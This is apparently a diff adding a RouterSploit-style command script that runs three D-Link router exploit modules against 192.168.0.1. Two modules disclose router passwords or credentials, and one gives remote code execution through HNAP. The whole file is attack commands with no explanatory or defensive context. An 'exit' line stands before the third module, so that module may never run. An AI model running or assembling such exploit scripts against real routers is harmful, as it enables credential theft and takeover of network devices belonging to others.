@@ -1,0 +1,10 @@
+use exploits/routers/dlink/dir_8xx_password_disclosure
+set target 192.168.0.1
+run
+use exploits/routers/dlink/multi_hnap_rce
+set target 192.168.0.1
+run
+exit
+use exploits/routers/dlink/dir_850l_creds_disclosure
+set target 192.168.0.1
+run
